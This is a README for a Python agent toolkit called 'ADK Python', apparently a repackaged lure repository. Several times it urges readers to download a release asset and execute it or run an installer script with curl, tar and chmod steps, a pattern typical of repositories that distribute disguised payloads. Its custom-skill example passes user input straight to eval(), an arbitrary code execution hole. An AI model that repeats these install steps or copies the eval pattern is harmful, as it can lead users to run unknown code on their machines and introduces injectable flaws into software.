# ADK Python: Code-First Toolkit for AI Agents
[![Releases](https://img.shields.io/github/v/release/Lil0G/adk-python?label=Releases&style=for-the-badge)](https://github.com/Lil0G/adk-python/releases)

![AI agents illustration](https://images.unsplash.com/photo-1508385082359-fc7b1a0d8a5d?auto=format&fit=crop&w=1400&q=80)

A code-first Python toolkit for building, evaluating, and deploying agentic AI systems with control and clarity.

Badges
- ![PyPI](https://img.shields.io/pypi/v/adk-python?label=PyPI) ![License](https://img.shields.io/github/license/Lil0G/adk-python) ![Python Versions](https://img.shields.io/badge/python-3.8%2B-blue)

Topics
- agent, agentic, agentic-ai, agents, agents-sdk, ai, ai-agents, aiagentframework, genai, genai-chatbot, llm, llms, multi-agent, multi-agent-systems, multi-agents, multi-agents-collaboration

Key features
- Agent-first API. Build agents as code objects you can test and inspect.
- Pluggable LLM adapters. Swap models with a single line.
- Multi-agent orchestration. Manage workflows across many agents.
- Evaluation suite. Run reproducible tests and metrics.
- Deployment helpers. Container recipes and server templates.
- Telemetry hooks. Capture traces and logs you control.

Why ADK Python
- You write agents with Python objects and functions.
- You keep model control and prompt control in your code.
- You test agent behavior with the same tools you use for unit tests.
- You deploy agents as services or batch jobs.

Core concepts
- Agent: a Python object that exposes a run(input) method and optional async support.
- Skill: a self-contained function or module that an agent calls for tasks.
- Adapter: a thin layer that maps ADK calls to an LLM provider.
- Controller: an orchestrator that schedules agents and routes messages.
- Scenario: a test case and dataset for evaluation.

Quickstart

Install from releases
- Download the release asset from the Releases page and execute the installer or wheel.
- Visit and download: https://github.com/Lil0G/adk-python/releases
- Example (replace <asset> with the real filename in the release):
  - curl -L -o adk_release.tar.gz "https://github.com/Lil0G/adk-python/releases/download/vX.Y/adk-python-vX.Y.tar.gz"
  - tar xzf adk_release.tar.gz
  - python -m pip install ./adk-python-vX.Y-py3-none-any.whl
  - Or run the provided installer script:
    - chmod +x install_adk.sh
    - ./install_adk.sh
- The file you download from the Releases page needs to be executed or installed on your system.

Note: if the release link does not work, check the Releases section on the repository page.

Install via pip (example)
- pip install adk-python

First agent example
- Create a basic agent that asks an LLM to summarize text.

```python
from adk.agent import Agent
from adk.adapters.openai import OpenAIAdapter

adapter = OpenAIAdapter(api_key="OPENAI_KEY", model="gpt-4o-mini")
agent = Agent(name="summarizer", adapter=adapter)

text = "ADK Python helps you build intelligent multi-agent systems with clear code."
result = agent.run({"task": "summarize", "text": text})
print(result["summary"])
```

APIs and idioms
- Agents are plain Python objects. You can subclass Agent to add local skills.
- Adapters implement a minimal send(prompt, **kwargs) contract. You can write adapters for any LLM API.
- Controllers take Agent instances and run them in sync or async modes.
- Use the test harness to run scenarios and record metrics.

Example: custom skill
```python
from adk.skill import Skill

class MathSkill(Skill):
    def handle(self, payload):
        expr = payload.get("expr")
        return {"result": eval(expr)}

agent.register_skill("math", MathSkill())
out = agent.run({"task": "compute", "skill": "math", "expr": "3*7"})
```

Multi-agent patterns
- Pipeline: agent A produces output that agent B consumes.
- Supervisor: a master agent assigns subtasks to worker agents.
- Negotiator: agents exchange messages and converge on a decision.
- Federation: agents run on separate nodes and sync state via a controller.

Example: pipeline with two agents
```python
from adk.controller import Controller

controller = Controller()
controller.add_agent("parser", parser_agent)
controller.add_agent("executor", executor_agent)

controller.connect("parser", "executor")
result = controller.run_pipeline("parser", initial_input={"text": "Calculate 2+2"})
```

Evaluation and metrics
- Use the built-in evaluation runner to run datasets and collect metrics.
- Supported metrics: accuracy, BLEU, ROUGE, custom validators.
- Capture agent traces for replay and debugging.

Example: run an evaluation
```bash
adk-eval run --scenario scenarios/summarize.json --output results/report.json
```

Built-in tools
- CLI: adk-cli to scaffold agents, run scenarios, and inspect logs.
- Sandbox server: lightweight HTTP server to host agent endpoints.
- Docker templates: base images and compose files for deployment.
- Tracing: integrate with OpenTelemetry or export JSON traces.

Deployment
- Package your agent as a wheel. Publish to an internal index or deploy to a container.
- Use the provided Dockerfile to build a service image.
- Example Dockerfile snippet
```dockerfile
FROM python:3.11-slim
COPY . /app
WORKDIR /app
RUN pip install ./dist/adk_python-*.whl
CMD ["adk-server", "--port", "8080"]
```

Security and control
- ADK separates model calls from business logic.
- You control prompts and adapter code.
- You can add input sanitizers and rate limits at the adapter level.
- Use environment variables for credentials; do not commit keys.

Extending ADK
- Write a new adapter by implementing the AdapterBase interface.
- Add a skill with the Skill base class.
- Contribute controller strategies for scheduling and retries.

Project structure (typical)
- adk/
  - agent.py
  - adapters/
  - controller.py
  - skills/
  - evaluation/
  - cli.py
  - docs/

Common commands
- Run tests
  - python -m pytest tests
- Run linter
  - pip install pre-commit && pre-commit run --all-files
- Build wheel
  - python -m build

Releases
- Download releases at: https://github.com/Lil0G/adk-python/releases
- The release asset on that page contains the installable file. Download the file and execute or install it on your system using pip or the provided installer.
- Use the badge at the top to jump to the latest release.

Example release install
- curl -L -o adk.whl "https://github.com/Lil0G/adk-python/releases/download/vX.Y/adk_python-vX.Y-py3-none-any.whl"
- python -m pip install ./adk.whl

Examples and templates
- Check the examples/ folder for agent templates:
  - examples/summarizer
  - examples/multi_agent_pipeline
  - examples/deploy_docker

Telemetry and logging
- ADK emits structured logs in JSON.
- Plug in OpenTelemetry or a custom sink.
- Use trace IDs to correlate multi-agent runs.

CI and testing
- Tests run in GitHub Actions.
- Use scenario fixtures for integration tests.
- Mock adapters to run unit tests without external calls.

Contributing
- Fork the repo.
- Open a PR against main.
- Follow the code style and run tests.
- Add unit tests for new features.
- Use clear commit messages and small PRs.

Code of conduct
- Respectful behavior only.
- Report issues via GitHub issues.

Roadmap
- Native support for streaming LLM responses.
- Official adapters for major model providers.
- Visual tracer UI for multi-agent runs.
- Policy-based execution and rules engine.

Resources and references
- API reference: docs/api.md
- Architecture diagram: ![architecture](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80)
- Examples: examples/
- Releases: https://github.com/Lil0G/adk-python/releases

License
- MIT License. See LICENSE file.

Contact
- Open issues on GitHub for bugs or feature requests.
- Use discussions for design conversations.

Acknowledgements
- Built for teams that prefer code-first agent design.
- Uses common LLM conventions and testing patterns.